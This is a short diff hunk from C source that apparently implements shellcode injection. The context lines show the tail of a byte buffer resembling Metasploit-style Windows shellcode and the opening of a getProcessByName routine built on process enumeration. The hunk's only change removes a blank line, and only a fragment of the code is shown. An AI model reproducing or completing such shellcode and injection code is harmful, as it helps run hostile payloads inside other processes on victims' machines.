@@ -46,7 +46,6 @@ unsigned char buf[] =
 "\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0"
 "\xb5\xa2\x56\xff\xd5";
 
-
 DWORD getProcessByName(const WCHAR* name)
 {
     PROCESSENTRY32W entry;
